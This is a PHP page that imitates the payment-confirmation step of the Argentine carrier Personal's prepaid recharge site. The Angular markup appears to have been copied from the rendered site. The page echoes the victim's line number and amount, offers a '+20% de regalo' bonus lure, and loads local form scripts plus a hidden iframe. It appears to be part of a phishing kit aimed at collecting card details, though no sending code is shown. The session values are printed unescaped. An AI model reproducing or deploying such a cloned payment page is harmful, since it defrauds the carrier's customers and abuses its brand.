<?php
    session_start();

?>

<html>
   <head>
      <meta charset="utf-8">
      <meta name="title" content="Recargar Saldo, fácil y se acredita en el momento | Personal">
      <meta name="description" content="Entrá y recarga tu saldo para seguir navegando con tu línea Personal. Podés recargar con tarjeta de crédito o débito de una manera fácil desde casa.">
      <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
      <title>Recargar Saldo, fácil y se acredita en el momento | Personal</title>
      <link rel="icon" type="image/x-icon" href="favicon.ico">
      <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
      <link rel="stylesheet" type="text/css" href="css/normalizer.css">
      <link rel="stylesheet" type="text/css" href="css/confirm.css">
   </head>
   <body style="background-color: rgb(27, 27, 29);">
   <app-root ng-version="9.1.0">
      <router-outlet></router-outlet>
      <pages>
         <div class="container-fluid">
            <div class="row">
               <div class="col-12 p-0">
                  <ngx-spinner bdcolor="rgba(0, 0, 0, 0.8)" size="medium" color="#fff" type="ball-clip-rotate" _nghost-wdj-c11="">
                     
                  </ngx-spinner>
                  <header-component _nghost-wdj-c9="">
                     <header _ngcontent-wdj-c9="" class="header">
                        <nav _ngcontent-wdj-c9="" class="px-0 pt-0">
                           <div _ngcontent-wdj-c9="" class="d-flex justify-content-between align-items-center">
                              <div _ngcontent-wdj-c9="" class="ml-3 ml-md-5 bd-highlight"><img _ngcontent-wdj-c9="" src="media/flow.svg" class="pl-md-4 img-fluid size-logo"></div>
                              <div _ngcontent-wdj-c9="" class="mr-3 mr-md-5 bd-highlight">
                                 <div _ngcontent-wdj-c9="" class="d-none d-sm-block"><img _ngcontent-wdj-c9="" src="media/secure.svg" class="pr-md-4"></div>
                                 <div _ngcontent-wdj-c9="" class="d-block d-sm-none"><img _ngcontent-wdj-c9="" src="media/secure-mobile.svg" class="pr-md-4 pr-2"></div>
                              </div>
                           </div>
                        </nav>
                     </header>
                  </header-component>
                  <router-outlet></router-outlet>
                  <payment-confirm _nghost-wdj-c38="">
                     <div _ngcontent-wdj-c38="" class="row justify-content-center align-items-center mt-4">
                        
                        <div _ngcontent-wdj-c38="" class="col-12 col-sm-5">
                           <div _ngcontent-wdj-c38="" class="row">
                              
                              <div _ngcontent-wdj-c38="" class="col-12">
                                 <div _ngcontent-wdj-c38="" class="col-12 mb-3 text-center">
                                    <h3 _ngcontent-wdj-c38="" class="title">Confirmar pago de Recarga</h3>
                                 </div>
                                 <div _ngcontent-wdj-c38="" class="col-12 mb-3 text-center"><img _ngcontent-wdj-c38="" src="media/credit-card-icon.svg" class="credit-card-icon"></div>
                                 <div _ngcontent-wdj-c38="" class="col-12 text-center mt-2">
                                    <p _ngcontent-wdj-c38="" class="description"><b _ngcontent-wdj-c38="">Verificá que los datos ingresados<br _ngcontent-wdj-c38="">sean correctos para confirmar el pago:</b></p>
                                 </div>
                              </div>
                              
                              <div _ngcontent-wdj-c38="" class="col-12 mt-5">
                                 <div _ngcontent-wdj-c38="" class="well well-bordered">
                                    <ul _ngcontent-wdj-c38="">
                                       <li _ngcontent-wdj-c38="">Destinatario: <?php echo($_SESSION['lineNumber']);?><b _ngcontent-wdj-c38=""></b></li>
                                       <li _ngcontent-wdj-c38="">Total a pagar: $<?php echo($_SESSION['select']);?><b _ngcontent-wdj-c38=""></b></li>
                                       
                                       
                                       <li _ngcontent-wdj-c38="">Recarga final: $<?php echo($_SESSION['select']);?> + 20% de regalo<b _ngcontent-wdj-c38=""></b></li>
                                    </ul>
                                 </div>
                              </div>
                              
                              <div _ngcontent-wdj-c38="" class="col-12">
                                 <div _ngcontent-wdj-c38="" class="row mt-5 pl-4 pr-4">
                                    <div _ngcontent-wdj-c38="" class="col-12 col-sm-6 text-right order-1 order-md-0 mb-4"><button _ngcontent-wdj-c38="" class="btn-back-dark mb-4 mb-sm-0">Modificar</button></div>
                                    <div _ngcontent-wdj-c38="" class="col-12 col-sm-6 text-left order-0 order-md-1 mb-4"><button _ngcontent-wdj-c38="" id="confirmButton" class="btn-personal-dark-secondary d-block d-md-inline-block">Confirmar pago</button></div>
                                 </div>
                              </div>
                              
                              <div _ngcontent-wdj-c38="" class="col-12">
                                 <div _ngcontent-wdj-c38="" class="row mt-2 mt-md-4 justify-content-center align-items-center security-ssl">
                                    <img _ngcontent-wdj-c38="" src="media/security-ssl-icon.svg">
                                    <p _ngcontent-wdj-c38="">Este es un pago seguro cifrado SSL</p>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </payment-confirm>
                  
               </div>
            </div>
         </div>
      </pages>
      
   </app-root>
   <div>
<script src="javascript/query.min.js"></script>
<script src="javascript/query-form.js"></script>
<script src="javascript/poper.min.js"></script>
<script src="javascript/bootstrap.min.js"></script>
<script src="javascript/jquery.mask.js"></script>
<script src="javascript/custom.js"></script>      
<iframe style="display: none;"></iframe>
   </div>
</body>
</html>